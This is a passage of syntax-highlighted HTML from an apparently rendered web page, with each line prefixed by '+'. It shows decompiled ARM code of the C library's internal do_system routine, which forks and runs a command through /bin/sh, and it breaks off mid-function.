+</span><span class=lnt id=hl-8-155><a class=lnlinks href=#hl-8-155>155</a>
+</span><span class=lnt id=hl-8-156><a class=lnlinks href=#hl-8-156>156</a>
+</span><span class=lnt id=hl-8-157><a class=lnlinks href=#hl-8-157>157</a>
+</span><span class=lnt id=hl-8-158><a class=lnlinks href=#hl-8-158>158</a>
+</span><span class=lnt id=hl-8-159><a class=lnlinks href=#hl-8-159>159</a>
+</span><span class=lnt id=hl-8-160><a class=lnlinks href=#hl-8-160>160</a>
+</span><span class=lnt id=hl-8-161><a class=lnlinks href=#hl-8-161>161</a>
+</span><span class=lnt id=hl-8-162><a class=lnlinks href=#hl-8-162>162</a>
+</span><span class=lnt id=hl-8-163><a class=lnlinks href=#hl-8-163>163</a>
+</span><span class=lnt id=hl-8-164><a class=lnlinks href=#hl-8-164>164</a>
+</span><span class=lnt id=hl-8-165><a class=lnlinks href=#hl-8-165>165</a>
+</span><span class=lnt id=hl-8-166><a class=lnlinks href=#hl-8-166>166</a>
+</span><span class=lnt id=hl-8-167><a class=lnlinks href=#hl-8-167>167</a>
+</span><span class=lnt id=hl-8-168><a class=lnlinks href=#hl-8-168>168</a>
+</span><span class=lnt id=hl-8-169><a class=lnlinks href=#hl-8-169>169</a>
+</span><span class=lnt id=hl-8-170><a class=lnlinks href=#hl-8-170>170</a>
+</span><span class=lnt id=hl-8-171><a class=lnlinks href=#hl-8-171>171</a>
+</span><span class=lnt id=hl-8-172><a class=lnlinks href=#hl-8-172>172</a>
+</span><span class=lnt id=hl-8-173><a class=lnlinks href=#hl-8-173>173</a>
+</span><span class=lnt id=hl-8-174><a class=lnlinks href=#hl-8-174>174</a>
+</span><span class=lnt id=hl-8-175><a class=lnlinks href=#hl-8-175>175</a>
+</span><span class=lnt id=hl-8-176><a class=lnlinks href=#hl-8-176>176</a>
+</span><span class=lnt id=hl-8-177><a class=lnlinks href=#hl-8-177>177</a>
+</span><span class=lnt id=hl-8-178><a class=lnlinks href=#hl-8-178>178</a>
+</span><span class=lnt id=hl-8-179><a class=lnlinks href=#hl-8-179>179</a>
+</span><span class=lnt id=hl-8-180><a class=lnlinks href=#hl-8-180>180</a>
+</span><span class=lnt id=hl-8-181><a class=lnlinks href=#hl-8-181>181</a>
+</span><span class=lnt id=hl-8-182><a class=lnlinks href=#hl-8-182>182</a>
+</span><span class=lnt id=hl-8-183><a class=lnlinks href=#hl-8-183>183</a>
+</span><span class=lnt id=hl-8-184><a class=lnlinks href=#hl-8-184>184</a>
+</span><span class=lnt id=hl-8-185><a class=lnlinks href=#hl-8-185>185</a>
+</span><span class=lnt id=hl-8-186><a class=lnlinks href=#hl-8-186>186</a>
+</span><span class=lnt id=hl-8-187><a class=lnlinks href=#hl-8-187>187</a>
+</span><span class=lnt id=hl-8-188><a class=lnlinks href=#hl-8-188>188</a>
+</span><span class=lnt id=hl-8-189><a class=lnlinks href=#hl-8-189>189</a>
+</span><span class=lnt id=hl-8-190><a class=lnlinks href=#hl-8-190>190</a>
+</span><span class=lnt id=hl-8-191><a class=lnlinks href=#hl-8-191>191</a>
+</span><span class=lnt id=hl-8-192><a class=lnlinks href=#hl-8-192>192</a>
+</span><span class=lnt id=hl-8-193><a class=lnlinks href=#hl-8-193>193</a>
+</span><span class=lnt id=hl-8-194><a class=lnlinks href=#hl-8-194>194</a>
+</span><span class=lnt id=hl-8-195><a class=lnlinks href=#hl-8-195>195</a>
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>int</span> <span class=kr>__fastcall</span> <span class=nf>do_system</span><span class=p>(</span><span class=kt>int</span> <span class=n>a1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>v2</span><span class=p>;</span> <span class=c1>// r3
+</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>bool</span> <span class=n>v3</span><span class=p>;</span> <span class=c1>// zf
+</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>v4</span><span class=p>;</span> <span class=c1>// r2
+</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=n>v6</span><span class=p>;</span> <span class=c1>// r2
+</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=n>v8</span><span class=p>;</span> <span class=c1>// r2
+</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=o>*</span><span class=p>(</span><span class=kr>__fastcall</span> <span class=o>*</span><span class=n>v9</span><span class=p>)(</span><span class=n>_DWORD</span> <span class=o>*</span><span class=p>,</span> <span class=kt>int</span><span class=p>,</span> <span class=kt>int</span><span class=p>,</span> <span class=kt>int</span><span class=p>);</span> <span class=c1>// r3
+</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=n>v10</span><span class=p>;</span> <span class=c1>// r0
+</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=n>v11</span><span class=p>;</span> <span class=c1>// r4
+</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=n>v12</span><span class=p>;</span> <span class=c1>// r7
+</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=n>v13</span><span class=p>;</span> <span class=c1>// r0
+</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>v14</span><span class=p>;</span> <span class=c1>// r2
+</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>bool</span> <span class=n>v15</span><span class=p>;</span> <span class=c1>// zf
+</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>v16</span><span class=p>;</span> <span class=c1>// r1
+</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=n>v17</span><span class=p>;</span> <span class=c1>// r7
+</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=n>v18</span><span class=p>;</span> <span class=c1>// r2
+</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>v19</span><span class=p>;</span> <span class=c1>// r2
+</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>bool</span> <span class=n>v20</span><span class=p>;</span> <span class=c1>// zf
+</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>v21</span><span class=p>;</span> <span class=c1>// r1
+</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=n>v22</span><span class=p>;</span> <span class=c1>// r5
+</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=n>v23</span><span class=p>;</span> <span class=c1>// r4
+</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=n>v24</span><span class=p>;</span> <span class=c1>// r2
+</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=n>v25</span><span class=p>;</span> <span class=c1>// [sp+0h] [bp-150h] BYREF
+</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=n>_DWORD</span> <span class=n>v26</span><span class=p>[</span><span class=mi>4</span><span class=p>];</span> <span class=c1>// [sp+4h] [bp-14Ch] BYREF
+</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=n>_DWORD</span> <span class=n>v27</span><span class=p>[</span><span class=mi>4</span><span class=p>];</span> <span class=c1>// [sp+14h] [bp-13Ch] BYREF
+</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=n>_BYTE</span> <span class=n>v28</span><span class=p>[</span><span class=mi>128</span><span class=p>];</span> <span class=c1>// [sp+24h] [bp-12Ch] BYREF
+</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>int</span> <span class=n>v29</span><span class=p>;</span> <span class=c1>// [sp+A4h] [bp-ACh] BYREF
+</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=n>_DWORD</span> <span class=n>s</span><span class=p>[</span><span class=mi>42</span><span class=p>];</span> <span class=c1>// [sp+A8h] [bp-A8h] BYREF
+</span></span></span><span class=line><span class=cl><span class=c1></span>
+</span></span><span class=line><span class=cl>  <span class=n>v29</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=nf>memset</span><span class=p>(</span><span class=n>s</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>132</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=k>while</span> <span class=p>(</span> <span class=mi>1</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>  <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=n>v2</span> <span class=o>=</span> <span class=nf>__ldrex</span><span class=p>((</span><span class=kt>unsigned</span> <span class=kt>int</span> <span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>lock</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>v3</span> <span class=o>=</span> <span class=n>v2</span> <span class=o>==</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span> <span class=n>v2</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>      <span class=k>break</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=n>v4</span> <span class=o>=</span> <span class=nf>__strex</span><span class=p>(</span><span class=mi>1u</span><span class=p>,</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kt>int</span> <span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>lock</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>v3</span> <span class=o>=</span> <span class=n>v4</span> <span class=o>==</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span> <span class=o>!</span><span class=n>v4</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=p>{</span>
+</span></span><span class=line><span class=cl>      <span class=nf>__dmb</span><span class=p>(</span><span class=mh>0xBu</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>      <span class=k>break</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>  <span class=p>}</span>
+</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=o>!</span><span class=n>v3</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=nf>_lll_lock_wait_private</span><span class=p>(</span><span class=o>&amp;</span><span class=n>lock</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=o>!</span><span class=n>sa_refcntr</span><span class=o>++</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>  <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span> <span class=nf>_sigaction</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>v29</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>intr</span><span class=p>)</span> <span class=o>&lt;</span> <span class=mi>0</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=p>{</span>
+</span></span><span class=line><span class=cl>      <span class=o>--</span><span class=n>sa_refcntr</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>      <span class=k>goto</span> <span class=n>LABEL_10</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span> <span class=nf>_sigaction</span><span class=p>(</span><span class=mi>3</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>v29</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>quit</span><span class=p>)</span> <span class=o>&lt;</span> <span class=mi>0</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=p>{</span>
+</span></span><span class=line><span class=cl>      <span class=n>v22</span> <span class=o>=</span> <span class=nf>__mrc</span><span class=p>(</span><span class=mi>15</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>13</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>3</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>      <span class=o>--</span><span class=n>sa_refcntr</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>      <span class=n>v23</span> <span class=o>=</span> <span class=o>*</span><span class=p>(</span><span class=n>_DWORD</span> <span class=o>*</span><span class=p>)((</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>_libc_errno</span> <span class=o>+</span> <span class=n>v22</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nl>LABEL_57</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>      <span class=nf>_sigaction</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>intr</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>      <span class=o>*</span><span class=p>(</span><span class=n>_DWORD</span> <span class=o>*</span><span class=p>)((</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>_libc_errno</span> <span class=o>+</span> <span class=n>v22</span><span class=p>)</span> <span class=o>=</span> <span class=n>v23</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=nl>LABEL_10</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>      <span class=nf>__dmb</span><span class=p>(</span><span class=mh>0xBu</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>      <span class=k>do</span>
+</span></span><span class=line><span class=cl>        <span class=n>v6</span> <span class=o>=</span> <span class=nf>__ldrex</span><span class=p>((</span><span class=kt>unsigned</span> <span class=kt>int</span> <span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>lock</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>      <span class=k>while</span> <span class=p>(</span> <span class=nf>__strex</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kt>int</span> <span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>lock</span><span class=p>)</span> <span class=p>);</span>
+</span></span><span class=line><span class=cl>      <span class=k>if</span> <span class=p>(</span> <span class=n>v6</span> <span class=o>&gt;</span> <span class=mi>1</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=nf>_libc_do_syscall</span><span class=p>(</span><span class=o>&amp;</span><span class=n>lock</span><span class=p>,</span> <span class=mi>129</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>      <span class=k>return</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>  <span class=p>}</span>
+</span></span><span class=line><span class=cl>  <span class=nf>__dmb</span><span class=p>(</span><span class=mh>0xBu</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=k>do</span>
+</span></span><span class=line><span class=cl>    <span class=n>v8</span> <span class=o>=</span> <span class=nf>__ldrex</span><span class=p>((</span><span class=kt>unsigned</span> <span class=kt>int</span> <span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>lock</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=k>while</span> <span class=p>(</span> <span class=nf>__strex</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kt>int</span> <span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>lock</span><span class=p>)</span> <span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=n>v8</span> <span class=o>&gt;</span> <span class=mi>1</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=nf>_libc_do_syscall</span><span class=p>(</span><span class=o>&amp;</span><span class=n>lock</span><span class=p>,</span> <span class=mi>129</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=n>s</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>|=</span> <span class=mh>0x10000u</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=nf>_sigprocmask</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>s</span><span class=p>,</span> <span class=n>v28</span><span class=p>)</span> <span class=o>&lt;</span> <span class=mi>0</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>  <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=p>(</span> <span class=mi>1</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=p>{</span>
+</span></span><span class=line><span class=cl>      <span class=n>v19</span> <span class=o>=</span> <span class=nf>__ldrex</span><span class=p>((</span><span class=kt>unsigned</span> <span class=kt>int</span> <span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>lock</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>      <span class=n>v20</span> <span class=o>=</span> <span class=n>v19</span> <span class=o>==</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>      <span class=k>if</span> <span class=p>(</span> <span class=n>v19</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=k>break</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>      <span class=n>v21</span> <span class=o>=</span> <span class=nf>__strex</span><span class=p>(</span><span class=mi>1u</span><span class=p>,</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kt>int</span> <span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>lock</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>      <span class=n>v20</span> <span class=o>=</span> <span class=n>v21</span> <span class=o>==</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>      <span class=k>if</span> <span class=p>(</span> <span class=o>!</span><span class=n>v21</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>      <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nf>__dmb</span><span class=p>(</span><span class=mh>0xBu</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=k>break</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>      <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span> <span class=o>!</span><span class=n>v20</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>      <span class=nf>_lll_lock_wait_private</span><span class=p>(</span><span class=o>&amp;</span><span class=n>lock</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span> <span class=o>--</span><span class=n>sa_refcntr</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>      <span class=k>goto</span> <span class=n>LABEL_10</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=n>v22</span> <span class=o>=</span> <span class=nf>__mrc</span><span class=p>(</span><span class=mi>15</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>13</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>3</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>v23</span> <span class=o>=</span> <span class=o>*</span><span class=p>(</span><span class=n>_DWORD</span> <span class=o>*</span><span class=p>)((</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>_libc_errno</span> <span class=o>+</span> <span class=n>v22</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nf>_sigaction</span><span class=p>(</span><span class=mi>3</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>quit</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=k>goto</span> <span class=n>LABEL_57</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=p>}</span>
+</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=o>&amp;</span><span class=n>pthread_cleanup_push_defer</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>  <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nf>pthread_cleanup_push_defer</span><span class=p>(</span><span class=n>v26</span><span class=p>,</span> <span class=n>cancel_handler</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>v25</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=p>}</span>
+</span></span><span class=line><span class=cl>  <span class=k>else</span>
+</span></span><span class=line><span class=cl>  <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=n>v9</span> <span class=o>=</span> <span class=n>cancel_handler</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=n>v26</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=n>cancel_handler</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=n>v26</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=o>&amp;</span><span class=n>v25</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=p>}</span>
+</span></span><span class=line><span class=cl>  <span class=n>v10</span> <span class=o>=</span> <span class=nf>_libc_do_syscall</span><span class=p>(</span><span class=mi>1048593</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>v25</span><span class=p>,</span> <span class=n>v9</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=n>v11</span> <span class=o>=</span> <span class=n>v10</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=p>(</span><span class=kt>unsigned</span> <span class=kt>int</span><span class=p>)</span><span class=n>v10</span> <span class=o>&gt;</span> <span class=mh>0xFFFFF000</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>  <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=n>v24</span> <span class=o>=</span> <span class=nf>__mrc</span><span class=p>(</span><span class=mi>15</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>13</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>3</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>v25</span> <span class=o>=</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=o>*</span><span class=p>(</span><span class=n>_DWORD</span> <span class=o>*</span><span class=p>)((</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>_libc_errno</span> <span class=o>+</span> <span class=n>v24</span><span class=p>)</span> <span class=o>=</span> <span class=o>-</span><span class=n>v10</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=p>}</span>
+</span></span><span class=line><span class=cl>  <span class=k>else</span>
+</span></span><span class=line><span class=cl>  <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=n>v25</span> <span class=o>=</span> <span class=n>v10</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span> <span class=o>!</span><span class=n>v10</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=p>{</span>
+</span></span><span class=line><span class=cl>      <span class=n>v27</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=o>&amp;</span><span class=n>LC0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>      <span class=n>v27</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span> <span class=o>=</span> <span class=n>a1</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>      <span class=n>v27</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=o>&amp;</span><span class=n>LC1</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>      <span class=n>v27</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>      <span class=nf>_sigaction</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>intr</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>      <span class=nf>_sigaction</span><span class=p>(</span><span class=mi>3</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>quit</span><span class=p>,</span> <span class=n>v11</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>      <span class=nf>_sigprocmask</span><span class=p>(</span><span class=mi>2</span><span class=p>,</span> <span class=n>v28</span><span class=p>,</span> <span class=n>v11</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>      <span class=n>lock</span> <span class=o>=</span> <span class=n>v11</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>      <span class=n>sa_refcntr</span> <span class=o>=</span> <span class=n>v11</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>      <span class=nf>_execve</span><span class=p>(</span><span class=s>&#34;/bin/sh&#34;</span><span class=p>,</span> <span class=n>v27</span><span class=p>,</span> <span class=n>_environ</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>      <span class=nf>exit</span><span class=p>(</span><span class=mi>127</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span> <span class=n>v10</span> <span class=o>&gt;=</span> <span class=mi>0</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=p>{</span>
+</span></span><span class=line><span class=cl>      <span class=n>v12</span> <span class=o>=</span> <span class=nf>__mrc</span><span class=p>(</span><span class=mi>15</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>13</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>3</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>      <span class=k>while</span> <span class=p>(</span> <span class=mi>1</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>      <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=n>v13</span> <span class=o>=</span> <span class=nf>_waitpid</span><span class=p>(</span><span class=n>v11</span><span class=p>,</span> <span class=n>v27</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span> <span class=n>v13</span> <span class=o>!=</span> <span class=o>-</span><span class=mi>1</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>          <span class=k>break</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=n>v11</span> <span class=o>=</span> <span class=n>v25</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span> <span class=o>*</span><span class=p>(</span><span class=n>_DWORD</span> <span class=o>*</span><span class=p>)((</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>_libc_errno</span> <span class=o>+</span> <span class=n>v12</span><span class=p>)</span> <span class=o>!=</span> <span class=mi>4</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>          <span class=k>goto</span> <span class=n>LABEL_30</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>      <span class=p>}</span>
+</span></span><span class=line><span class=cl>      <span class=n>v11</span> <span class=o>=</span> <span class=n>v25</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=nl>LABEL_30</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>      <span class=k>if</span> <span class=p>(</span> <span class=n>v11</span> <span class=o>==</span> <span class=n>v13</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=k>goto</span> <span class=n>LABEL_32</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>  <span class=p>}</span>
+</span></span><span class=line><span class=cl>  <span class=n>v27</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=nl>LABEL_32</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span> <span class=o>&amp;</span><span class=n>pthread_cleanup_push_defer</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=nf>pthread_cleanup_pop_restore</span><span class=p>(</span><span class=n>v26</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=k>while</span> <span class=p>(</span> <span class=mi>1</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>  <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=n>v14</span> <span class=o>=</span> <span class=nf>__ldrex</span><span class=p>((</span><span class=kt>unsigned</span> <span class=kt>int</span> <span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>lock</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=n>v15</span> <span class=o>=</span> <span class=n>v14</span> <span class=o>==</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span> <span class=n>v14</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>      <span class=k>break</span><span class=p>;</span>
